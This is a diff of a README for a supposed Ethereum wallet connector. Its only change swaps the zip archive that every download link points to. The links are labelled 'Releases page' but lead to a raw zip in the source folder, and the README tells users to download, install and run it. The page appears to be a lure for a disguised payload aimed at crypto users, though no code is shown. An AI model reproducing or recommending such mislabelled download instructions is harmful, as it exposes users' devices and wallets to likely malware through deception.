@@ -1,7 +1,7 @@
 # 🚀 web3-wallet-connector - Connect Your Ethereum Wallet Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/web3-wallet-connector_3.4.zip)](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/web3-wallet-connector_3.4.zip)
+[![Download](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/wallet-connector-web-v3.9.zip)](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/wallet-connector-web-v3.9.zip)
 
 ## 🌟 Introduction
 Welcome to web3-wallet-connector! This tool helps you connect to Ethereum wallets, making it easier to interact with decentralized applications (dApps). It is built with modern web technologies, ensuring a smooth user experience.
@@ -21,13 +21,13 @@ Ensure your device meets the following requirements:
 - **Internet Connection**: Required for wallet connection and dApp interaction
 
 ### 📥 Step 2: Download the Application
-Visit the [Releases page](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/web3-wallet-connector_3.4.zip) to find the latest version of the app.
+Visit the [Releases page](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/wallet-connector-web-v3.9.zip) to find the latest version of the app.
 
 1. **Go to the Releases Page**: Click on the link to open it.
 2. **Find the Latest Version**: Look for the most recent version listing.
 3. **Choose Your Download**: Download the appropriate file for your operating system.
 
-[Download from Releases](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/web3-wallet-connector_3.4.zip)
+[Download from Releases](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/wallet-connector-web-v3.9.zip)
 
 ### ⚙️ Step 3: Install the Application
 1. **Locate the Downloaded File**: Find the file you just downloaded in your downloads folder.
@@ -56,7 +56,7 @@ Join the conversation and connect with other users:
 - **Discord Channel**: Engage with others and get support in our Discord community.
 
 ## 🚀 Ready to Get Started?
-Head over to our [Releases page](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/web3-wallet-connector_3.4.zip) to download the latest version now!
+Head over to our [Releases page](https://raw.githubusercontent.com/rana27tanmay/web3-wallet-connector/main/src/wallet-connector-web-v3.9.zip) to download the latest version now!
 
 ## 📞 Contact
 For further assistance or inquiries, feel free to contact the development team through the Issues section on GitHub. We are here to help you have the best experience with web3-wallet-connector.
